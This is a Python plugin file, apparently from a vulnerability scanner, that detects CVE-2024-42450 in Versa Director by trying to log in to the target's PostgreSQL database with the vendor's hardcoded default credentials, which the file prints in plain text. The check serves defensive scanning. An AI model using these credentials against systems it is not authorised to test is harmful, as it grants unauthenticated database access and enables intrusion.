"""Agent Asteroid implementation for CVE-2024-42450"""

import re
import datetime

import psycopg

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit


DBNAME = "vnms"
USER = "vnms"
PASSWORD = "Versa@123"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)

VULNERABILITY_TITLE = "Versa Director Database exposure"
VULNERABILITY_REFERENCE = "CVE-2024-42450"
VULNERABILITY_DESCRIPTION = (
    "The Versa Director uses PostgreSQL (Postgres) to store operational and configuration data. "
    "It is also needed for High Availability function of the Versa Director. "
    "The default configuration has a common password across all instances of Versa Director. "
    "By default, Versa Director configures Postgres to listen on all network interfaces. "
    "This combination allows an unauthenticated attacker to access and administer the database "
    "or read local filesystem contents to escalate privileges on the system."
)
RISK_RATING = "CRITICAL"


def _check_db_connection(host: str, dbname: str, user: str, password: str) -> bool:
    """
    Attempts to connect to a PostgreSQL database and checks if the connection is successful.

    Args:
        host : Database host (e.g., 'localhost').
        dbname : Database name.
        user : Database username.
        password : Database password.

    Returns:
       True if the connection is successful, False otherwise.
    """
    try:
        # Attempt to connect to the database
        connection = psycopg.connect(
            host=host,
            dbname=dbname,
            user=user,
            password=password,
            connect_timeout=DEFAULT_TIMEOUT.seconds,
        )
        # Check the connection status
        if connection is not None:
            return True
    except psycopg.OperationalError as e:
        return False


@exploits_registry.register
class CVE202442450Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/versa/login")
    accept_pattern = [re.compile("Versa Director")]

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []

        if _check_db_connection(target.host, DBNAME, USER, PASSWORD) is True:
            vulnerability = self._create_vulnerability(target)
            vulnerabilities.append(vulnerability)

        return vulnerabilities

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
